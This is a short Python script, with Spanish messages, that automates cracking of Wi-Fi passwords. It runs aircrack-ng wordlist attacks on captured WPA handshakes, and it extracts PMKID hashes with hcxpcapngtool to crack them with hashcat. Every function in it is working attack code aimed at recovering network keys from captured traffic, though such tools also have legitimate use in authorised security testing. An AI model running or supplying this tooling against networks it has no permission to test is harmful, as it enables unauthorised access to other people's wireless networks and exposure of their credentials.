import subprocess
import os

def validate_capture(pcap):
    if not os.path.exists(pcap):
        return False, "El archivo pcap no existe."
    result = subprocess.run(['aircrack-ng', pcap],
                            capture_output=True, text=True)
    return True, result.stdout[-500:]

def crack_handshake_aircrack(pcap, wordlist, bssid=None):
    """Crackea un handshake usando aircrack-ng."""
    if not os.path.exists(wordlist):
        return "Wordlist no encontrada."
    if not os.path.exists(pcap):
        return "Archivo pcap no encontrado."

    cmd = ['aircrack-ng', '-w', wordlist]
    if bssid:
        cmd += ['-b', bssid]
    cmd.append(pcap)

    print(f"[*] Ejecutando aircrack-ng...")
    try:
        # Ejecutamos aircrack-ng y mostramos la salida en tiempo real
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end='')
        process.wait()
        
        if process.returncode == 0:
            return "Ataque finalizado. Revisa la salida arriba para ver si se encontró la clave."
        else:
            return "Aircrack-ng falló o fue interrumpido."
    except Exception as e:
        return f"Error al ejecutar aircrack-ng: {e}"

def crack_pmkid_hashcat(pcap, wordlist):
    """Crackea un PMKID usando hashcat (requiere convertir a hash)."""
    if not os.path.exists(pcap):
        return "Archivo pcap no encontrado."
    
    hash_file = pcap.replace('.pcap', '.16800')
    
    print("[*] Extrayendo hash PMKID con hcxpcapngtool...")
    subprocess.run(['hcxpcapngtool', '-o', hash_file, pcap], capture_output=True)
    
    if not os.path.exists(hash_file):
        return "No se pudo extraer el hash PMKID."

    cmd = ['hashcat', '-m', '22000', '-a', '0', hash_file, wordlist, '--force']
    
    print(f"[*] Ejecutando hashcat...")
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end='')
        process.wait()
        return "Ataque con hashcat finalizado."
    except Exception as e:
        return f"Error al ejecutar hashcat: {e}"
